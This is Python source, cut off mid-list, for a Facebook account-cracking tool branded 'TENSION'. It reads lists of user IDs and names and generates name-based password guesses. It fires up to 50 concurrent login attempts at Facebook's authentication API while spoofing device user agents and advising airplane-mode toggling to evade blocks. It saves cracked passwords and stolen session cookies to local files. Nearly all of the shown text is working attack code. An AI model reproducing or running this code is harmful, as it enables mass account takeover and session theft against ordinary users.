    ua12=f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; Redmi Note 5 Pro Build/{str(build)}{str(numbr)}) [FBAN/MobileAdsManagerAndroid;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.75,width=720,height=1600};'+f'FBLC/{str(local)};FBRV/0;FBCR/{str(fbcr)};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/{str(fbs)};FBDV/Redmi Note 5 Pro;FBSV/7.2;FBOP/1;FBCA/x86:armeabi-v7a;]'
    ua13=f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; Pixel 3 Build/{str(build)}{str(numbr)}) [FBAN/Orca-Android;FBAV/{str(application_version)};FBPN/{str(fbs)};'+f'FBLC/{str(local)};FBBV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/12;FBCA/arm64-v8a:null;FBDM/'+'{density=2.75,width=1080,height=2028};'+'FBBK/1;'+'FBLR/0;'+'FB_FW/1;]'
    return random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,ua10,ua12,ua13])
    
#━━━━━━━━[ DEF UA ]━━━━━━━━#
from random import randrange as rr
kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','SM-A145P','JSS15J', 'GT-I9500','SM-G973W','SM-M325FV','SM-S906B','SM-A127F','GT-S6500','SM-W2021','SM-A346E','SM-A515F','SM-M236B','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','SM-G780G','SM-A515F','SM-G991V','SM-A226L','SM-J326AZ','MMB29M','GT-S6102','GT-I9295','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
kkkki = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'QKQ1.190910.002', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1','QP1A.579799.858'])
kki = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
kkki = random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
kkkkkz = f"|{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{str(random.randrange(1,99))}{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{str(random.randrange(1,19))}{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}{random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])}"
modlss = kkkkki+kkkkkz+kkkki+kkki+kki
def maxpro1():
      ua = f'Dalvik/2.1.0 (Linux; U; Android 10; Infinix {str(random.randrange(1900,2999))} Build/{str(kkkki)}) [FBAN/MessengerLite;FBAV/{str(rr(11,99))}.0.0.{str(rr(1,99))}.{str(rr(51,99))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/346850586;FBCR/TNT;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/'+modlss+';FBSV/10;FBCA/arm64-v8a:null;FBDM/'+'{density=2.0,width=720,height=1472};]'                                                                                 
      return ua

def api():
	rr = random.randint
	rc = random.choice
	versi = random.choice(["pt-BR","id","en"])
	bahasa = random.choice(["en","fr","ru","tr","id","pt","es","en-GB"])
	ua1 = f"Opera/9.80 (BlackBerry; Opera Mini/8.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua2 = f"SAMSUNG-GT-S3802 Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua3 = f"Opera/9.80 (iPhone; Opera Mini/16.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua4 = f"Opera/9.80 (Android; Opera Mini/11.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua5 = f"Opera/9.80 (Windows Mobile; Opera Mini/5.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	mmk = f"Mozilla/5.0 (Linux; U; Viera; {versi}) AppleWebKit/537.36 (KHTML, like Gecko) Viera/4.0.0 Chrome/{str(rr(30,150))}.0.{str(rr(2000,6000))}.{str(rr(70,200))} Safari/537.36 SmartTV"
	mm1 = f"Mozilla/5.0 (Linux; U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,150))}.0.{str(rr(2000,6000))}.{str(rr(25,150))} Mobile Safari/537.36 (SmartTV/8.5) (NetCast)"
	return random.choice([ua1,ua2,ua3,ua4,ua5,mmk,mm1])
      
os.system('xdg-open https://www.facebook.com/M4D3RCH9D.J1J4.K4.L9K.U8Y3.G4W')  
#<<_________[ COLOR ]_________>>#
sys.stdout.write('\x1b]2; TENSION\x07')
W = '\033[97;1m' 
B1 = '\033[96;1m'
P = '\033[95;1m' 
R = '\033[91;1m' 
G = '\033[92;1m'
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
#####____Host-Setup____#####   
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
#__________________LOGO____________#
logo =("""\033[0;92m


888888 888888 88b 88 .dP"Y8 88  dP"Yb  88b 88 
  88   88__   88Yb88 `Ybo." 88 dP   Yb 88Yb88 
  88   88""   88 Y88 o.`Y8b 88 Yb   dP 88 Y88 
  88   888888 88  Y8 8bodP' 88  YbodP  88  Y8                                                            
                                                      
\033[1;97m══════════════════════════════════════════════════
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO TENSION TOOLS               \033[;0m\033[1;91m\033[1;92m
\033[1;97m══════════════════════════════════════════════════
 \033[1;97m[\033[1;91m•\033[1;97m] Tool Owner    \033[1;91m: \033[1;96m  MR MALIK
 \033[1;97m[\033[1;91m•\033[1;97m] Facebook      \033[1;91m: \033[1;97m  ******
 \033[1;97m[\033[1;91m•\033[1;97m] Github        \033[1;91m: \033[1;97m  *****
 \033[1;97m[\033[1;91m•\033[1;97m] Tool          \033[1;91m:  \033[1;97m RENDOM+FILE
 \033[1;97m[\033[1;91m•\033[1;97m] Network       \033[1;91m:  \033[1;97m 3g,4g,5g,Wifi 
 \033[1;97m[\033[1;91m•\033[1;97m] Status        \033[1;91m:  \033[1;97m FREE
 \033[1;97m[\033[1;91m•\033[1;97m] Version       \033[1;91m: \033[1;92m  0.1
\033[1;97m══════════════════════════════════════════════════""") 

#<<_________[ YEAR ]_________>>#

def TENSION(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :alif = ' (*-*) 2009 √'
        elif ids[:9] in ['100000000']       :alif = ' ACCOUNT  2009 √'
        elif ids[:8] in ['10000000']        :alif = ' ACCOUNT 2009 √'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' ACCOUNT 2009 √'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:alif = ' ACCOUNT 2010 √'
        elif ids[:6] in ['100001']          :alif = ' ACCOUNT 2010/2011 √'
        elif ids[:6] in ['100002','100003'] :alif = ' ACCOUNT 2011/2012 √'
        elif ids[:6] in ['100004']          :alif = ' ACCOUNT 2012/2013 √'
        elif ids[:6] in ['100005','100006'] :alif = ' ACCOUNT 2013/2014 √'
        elif ids[:6] in ['100007','100008'] :alif = ' ACCOUNT 2014/2015 √'
        elif ids[:6] in ['100009']          :alif = ' ACCOUNT 2015 √'
        elif ids[:5] in ['10001']           :alif = ' ACCOUNT 2015/2016 √'
        elif ids[:5] in ['10002']           :alif = ' ACCOUNT 2016/2017 √'
        elif ids[:5] in ['10003']           :alif = ' ACCOUNT 2018/2019 √'
        elif ids[:5] in ['10004']           :alif = ' ACCOUNT 2019/2020 √'
        elif ids[:5] in ['10005']           :alif = ' ACCOUNT 2020 √'
        elif ids[:5] in ['10006','10007','']:alif = ' ACCOUNT 2021 √'
        elif ids[:5] in ['10008']           :alif = ' ACCOUNT 2022 √'
        elif ids[:5] in ['10009']           :alif = ' ACCOUNT 2023 √'
        elif ids[:5] in ['6155']           :alif = ' ACCOUNT 2023/2024√'
        else:alif=''
    elif len(ids) in [9,10]:
        alif = ' ACCOUNT 2008/2009 √'
    elif len(ids)==8:
        alif = ' ACCOUNT 2007/2008 √'
    elif len(ids)==7:
        alif = ' ACCOUNT 2006/2007 √'
    else:alif=''
    return alif
    
#<<_________[ LOOP ]_________>>#
loop=0
totaldmp = 0
count = 0
srange = 0
totaldmp = 0
twf=[]
oks=[]
cps=[]
ok=[]
cp=[]
pcp=[]
id=[]
tokenku=[] 
id = []
ps = []
sid = []
total=[]
methods = []
saved = []
filter = []
#__________________LINE____________#
def line():
    print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#<<_________[ CLEAR ]_________>>#
def clear():
	os.system(f'clear')
	print(logo)
	print(f' {G1}[{A}¥{G1}]{G1} DATE :{G1} '+date)
	line()
	print(f' {G1}[{A}¥{G1}]{G1} TIME:{G1}'+time.strftime("%H:%M")+" "+tag)
	line()

def Deactivate ():
	clear()
	print(f'{W} [{R}+{W}] {W}THIS TOOL IS OFF ')
	print(f'{W} [{R}+{W}] {W}TOOL IS UNDER MAINTENANCE ')
	print(f'{W} [{R}+{W}] {W}MYBE TAKE SOME TIME IN MAINTENANCE ')
	print(f'{W} [{R}+{W}] {W}SO PLEASE WAIT TOOL WILL BE UPDATE SOON ')
	exit()
def Free():
	paid = menu()
#<<_________[ MAIN MENU ]_________>>#
def menu():
			clear()
			print(f"  \033[1;91m\033[1;41m\033[1;97m              MAIN  MENU                \033[;0m\033[1;91m\033[1;92m    ")
			line()
			print(f' {G1}[{A}1{G1}]{G1} FILE CLONE ')
			print(f' {G1}[{A}2{G1}]{G1} RANDOM CLONE ')
			print(f' {G1}[{A}3{G1}]{G1} GMAIL CLONE')
			print(f' {G1}[{A}0{G1}]{G1} EXIT FROM TENSION TOOL')
			line()
			xd=input(f' {G1}[{A}?{G1}]{G1} CHOSE: ')
			if xd in ['1','01']:
				clear()
				print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}abc.txt')
				line()
				file = input(f' {G1}[{A}?{G1}]{G1} FILE NAME {A}➢{G1} ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(f'{G1}[{A}≈{G1}]{G1} FILE NOT FOUND')
					time.sleep(1)
					menu()
				clear()
				print(f"  \033[1;91m\033[1;41m\033[1;97m              METHOD MENU                \033[;0m\033[1;91m\033[1;92m    ")
				line()
				print(f' {G1}[{A}1{G1}]{G1} METHOD 1  {A}➢{G1}[{G1}FOR NEW IDS{G1}]')
				print(f' {G1}[{A}1{G1}]{G1} METHOD 2  {A}➢{G1}[{G1}FOR MIX IDS{G1}]')
				print(f' {G1}[{A}1{G1}]{G1} METHOD 3  {A}➢{G1}[{G1}FOR MIX IDS{G1}]')
				print(f' {G1}[{A}1{G1}]{G1} METHOD 4  {A}➢{G1}[{G1}FOR OLD IDS{G1}]')
				line()
				mthd=input(f' {G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
				line()
				plist = []
				clear()
				print(f' {A}[{G1}1{A}] {G1}𝐂𝐑𝐀𝐂𝐊 𝐖𝐈𝐓𝐇 𝐀𝐔𝐓𝐎 𝐏𝐀𝐒𝐒')
				print(f' {A}[{G1}2{A}] {G1}𝐂𝐑𝐀𝐂𝐊 𝐖𝐈𝐓𝐇 𝐌𝐀𝐍𝐔𝐀𝐋 𝐏𝐀𝐒𝐒')
				line()
				psx=input(f'{A}[{G1}+{A}] {G1}𝐂𝐇𝐎𝐒𝐄: ')
				clear()
				if psx in ['1','01']:
					plist.append('first last')
					plist.append('firstlast')
					plist.append('first123')
					plist.append('firstfirst')
					plist.append('lastlast')
					plist.append('first12345')
					plist.append('first1234')
					plist.append('firstlast123')
					plist.append('firstlast1234')
					plist.append('firstlast@123')
					plist.append("last123")
					plist.append('khankhan')
					plist.append('khan123')
					plist.append('khan12345')
					plist.append('khan786')
					plist.append('khan1122')
					plist.append('pakistan')
					plist.append("Last12345")
					plist.append('first123456')
					plist.append('first@123')
					plist.append('First@123')
					plist.append('first321')
					plist.append('First@12')
					plist.append('first@1234')
					plist.append('First123')
					plist.append('@first123')
					plist.append('@first1234')
					plist.append('first@@@')
					plist.append('first1122')
					plist.append('first786')
					plist.append('firstlast12345')
					plist.append('firstlast1122')
					plist.append('firstlast786')
					plist.append('first@123')
					plist.append('first@12345')
					plist.append('First last')
					plist.append('First123')
					plist.append('First@123')
					plist.append('last@123')
					plist.append('151214')
					plist.append('5121472')
					plist.append('57273200')
					plist.append('59039200')
					plist.append('57575751')
					plist.append('07860786')
					plist.append('15121472')
					plist.append('123456')
				else:
					try:
						ps_limit = int(input(f' {A} [{R}+{A}] {G1} PASS LIMIT : '))
					except:
						ps_limit =1
					clear()
					print(f' {A} [{R}+{A}] {G1} EXP: first last,firtslast,first123')
					line()
					for i in range(ps_limit):
						plist.append(input(f'{A} [{R}+{A}] {G1} PUT PASS {i+1}: '))
				clear()
				print(f' {A} [{R}+{A}] {G1} DO YOU WANT TO SHOW CP IDS ? (y/n): ')
				line()
				cx=input(f' {A} [{R}+{A}] {G1} CHOSE: ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				clear()
				print(f'{A} [{R}+{A}] {G1} DO YOU WANT TO SHOW COOKIE ? (y/n): ')
				line()
				cx=input(f'{A} [{R}+{A}] {G1} CHOSE: ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=50) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print(f' {G1}[{A}≈{G1}]{G1} TOTAL ID {A}➢{G1}{total_ids} ')
					print(f' {G1}[{A}≈{G1}]{G1} USED METHOD {A}➢{G1} {mthd}')
					print(f' {G1}[{A}≈{G1}]{G1} PASSWORD METHOD {A}➢{G1} {psx}')
					print(f' {G1}[{A}≈{G1}]{G1} PROCESS START PLEASE WAIT.....')
					print(f" {G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN")
					line()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(ffb1,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(ffb2,ids,names,passlist)
						elif mthd in ['3','03']:
							crack_submit.submit(ffb3,ids,names,passlist)
						elif mthd in ['4','04']:
							crack_submit.submit(ffb4,ids,names,passlist)
				print(f'\033[1;37m')
				print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')				
				print(f' {G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
				print(f" {G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1}%s "%(len(oks)))
				print(f" {G1}[{A}≈{G1}]{G1} TOTAL CP ID {A}➢{G1}%s "%(len(cps)))
				print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
				input(f' {G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
				menu()
			elif xd in ['2','02']:
				Main_Menu()
			elif xd in ['3','03']:
				gmail()		
		#	elif xd in ['4','04']:
		#		gmail()		
			elif xd in ['0','00']:
				exit(f'{G1}[{A}≈{G1}]{G1} Thanks For Use ')
			else:
				exit(f'{G1}[{A}≈{G1}]{G1} Option not found in menu...')
#<<_________[ METHOD 1 ]_________>>#
def ffb1(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{A}[{G1}TENSION-XD{A}]{G1} %s{A} | {G1}M1 \033[1;92mOK/{G1}CP{A} %s/%s {A}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())                 
                        data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'cpl': 'true',
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'device_based_login_password',
'error_detail_type': 'button_with_disabled',
'source': 'register_api',
'email': ids,
'password': pas,
'access_token': '275254692598279|585aec5b4c27376758abb7ffcb9db2af',
'generate_session_cookies': '1',
'meta_inf_fbmeta': 'NO_FILE',
'advertiser_id': str(uuid.uuid4()),
'currently_logged_in_userid': '0',
'locale': 'en_GB',
'client_country_code': 'GB',
'method': 'auth.login',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
'api_key': '882a8490361da98702bf97a021ddc14d',
'sig': '1d2d2c81b7ac43af4db39465bf23e77e'}
                        headers = {'Authorization': 'OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af',
'X-FB-Net-HNI': '20083',
'User-Agent': maxpro1(),
'X-FB-Client-IP': 'True',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-SIM-HNI': '37460',
'X-Tigon-Is-Retry': 'False',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Connection-Quality': 'MOBILE.LTE',
'X-FB-Server-Cluster': 'True',
'Connection': 'keep-alive',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Host': 'graph.facebook.com',
'X-FB-Connection-Bandwidth': '80025933',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'Accept-Encoding': 'gzip, deflate',
'X-FB-Connection-Type': 'MOBILE.LTE',
'Content-Type': 'application/x-www-form-urlencoded'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G} [TENSION-OK] '+ids+' [√] '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
                                        print(f'\r{G1}[{S}COOKIE🍪{G1}] :{A} '+coki)
                                        open('/sdcard/TENSION-M1-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/TENSION-M1-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [TENSION-CP] '+ids+' [√] '+pas+'\033[1;97m')
                                                open('/sdcard/TENSION-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
        	time.sleep(20)
        except Exception as e:
        	time.sleep(20)
xxxxx=('GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268''GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-I8750','GT-I900','GT-I9008L','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9190','GT-I9192','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9300','GT-I9300I','GT-I9301I','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9500','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-M5650','GT-N5000S','GT-N510